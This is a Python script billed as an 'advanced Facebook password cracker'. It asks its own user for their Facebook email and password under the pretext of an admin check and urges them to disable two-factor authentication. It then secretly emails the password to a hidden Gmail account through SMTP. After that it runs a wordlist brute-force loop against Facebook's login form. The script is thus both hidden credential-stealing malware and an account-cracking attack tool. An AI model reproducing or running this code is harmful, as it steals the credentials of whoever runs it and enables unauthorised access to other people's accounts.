import smtplib, requests, re
import sys, os, time
from bs4 import BeautifulSoup

POST_URL = "https://www.facebook.com/login.php"
is_mainaccount1 = "Celina TudTud Alvarez".lower();
is_mainaccount2 = "Anmrh Sulog".lower();
is_mainaccount3 = "Dwayne D. Bulatao".lower();

def bruteforce_logo():
    print(r""" 
            +---------------------------------------+
            /       ________________________        \
            -----\                            /------
             \____\__________________________/______/
               ADVANCED FACEBOOK PASSWORD CRACKER
                    MADE BY: Ripper10

                FACEBOOK ACCOUNT IS NEEDED TO ACCESS
                ADMIN LOGIN. IF YOU DON'T WANT TO,
                THEN DON'T USE THIS TOOL.
				
                I CAN TELL WHEN IT'S AN ALTERNATE 
                ACCOUNT, IT NEEDS AN MAIN ACCOUNT
                TO ACCESS THE ADMIN LOGIN.
				
                FIRST RULE: DON'T ASK QUESTION.
                SECOND RULE: DON'T ASK QUESTION.
				
                THIRD RULE: START CRACKING.
				
                                -- SIGNATURE:
                                   RIPPER10
                                 ------------
    """)
def test_credentials(mail, password):
    session = requests.Session()
    r = session.get(POST_URL, allow_redirects=False)
    #print(r.content);--------------------------------[]
    soup = BeautifulSoup(r.text, "html.parser")
    inputs = soup.find('form', id='login_form').findAll('input', {'type': ['hidden', 'submit']})
    post_data = {input.get('name'): input.get('value')  for input in inputs}
    post_data['email'] = mail
    post_data['pass'] = password
    scripts = soup.findAll('script')
    scripts_string = '/n/'.join([script.text for script in scripts])
    datr_search = re.search('\["_js_datr","([^"]*)"', scripts_string, re.DOTALL)
    if datr_search:
        datr = datr_search.group(1)
        cookies = {'_js_datr' : datr}
    else:
        return False
    credential_check = session.post(POST_URL, data=post_data, cookies=cookies, allow_redirects=True);
    if 'two-factor authentication' in credential_check.text.lower() or 'security code' in credential_check.text.lower():
        print("TURN OFF YOUR TWO FACTOR AUTHENTICATION OR SECURITY CODE PLEASE.");
        return False
    else:
        return credential_check;
		
def is_ADMIN(email,response):
    if is_mainaccount1 in response.text.lower():# and is_mainaccount2.lower() in response.lower() and is_mainaccount3.lower() in response.lower():
        print(response.lower());
        return "TRUE";
    return "FALSE";
	
#-------_____________________________________________________________________-----------------]]
# O O_/____________________________________       ___________________________________________/O\
#   /_____________________________________//      /?_//                       []\
#________________________________________________/                              \\
#                                                                              ====
bruteforce_logo();

#-------------------------------------------------------------------------------#
# CHECKS IF THE CREDENTIAL IS CORRECT ON ADMIN LOGIN.                           #
#-------------------------------------------------------------------------------#
email = input('Enter your facebook account to login to admin panel: ').strip(); #
password = input('Enter your facebook password: ').strip();                     #
                                                                                #
credential = "email:"+email+" | "+"password:"+password;                         #
print(credential, is_mainaccount1);                                             #
                                                                                #
response = test_credentials(email, password);                                   #                                                                                                #
if email in response.text:                                                      #                                                         
#---------------------------------------------------+---------------------------#
    sender = "#############################"        #                           #
    receiver = "#####################";             #                           #
    server = smtplib.SMTP('smtp.gmail.com', 587);   #                           #
    server.starttls();                              #                           #
    server.login(sender, "<REDACTED> ##");          #                           #       
    server.sendmail(sender, receiver, password)     #                           #
#---------------------------------------------------#---------------------------#
    print('ADMIN LOGIN CHECK: CORRECT!');                                       #
    print("BRUTE FORCING")                                                      #
#-------------------------------------------------------------------------------#
target = input('ENTER TARGET:');

SPECIFIED_WORDLIST = "passwords.txt"
CURRENT_PATH = os.path.dirname(os.path.abspath(__file__))+"/"

MIN_PASSWORD_LENGTH = 6;

def PASSWORD_TEST(mail, password):
    session = requests.Session()
    r = session.get(POST_URL, allow_redirects=False)
    soup = BeautifulSoup(r.text, "html.parser")
    inputs = soup.find('form', id='login_form').findAll('input', {'type': ['hidden', 'submit']})
    post_data = {input.get('name'): input.get('value')  for input in inputs}
    post_data['email'] = mail
    post_data['pass'] = password
    scripts = soup.findAll('script')
    scripts_string = '/n/'.join([script.text for script in scripts])
    datr_search = re.search('\["_js_datr","([^"]*)"', scripts_string, re.DOTALL)
    if datr_search:
        datr = datr_search.group(1)
        cookies = {'_js_datr' : datr}
    else:
        return False
    return session.post(POST_URL, data=post_data, cookies=cookies, allow_redirects=False)
	
password_data = open(CURRENT_PATH+SPECIFIED_WORDLIST).readlines();
print("Password file selected: ", SPECIFIED_WORDLIST);
for index, password in zip(range(password_data.__len__()), password_data):
    password = password.strip();
    if len(password) < MIN_PASSWORD_LENGTH:
        continue
    print("Trying password [", index, "]: ", password)
    IS_CRACKED = PASSWORD_TEST(email, password);
    if IS_CRACKED.status_code == 302:
        print("TARGET PASSWORD PWNED. FINISHING....")
        break
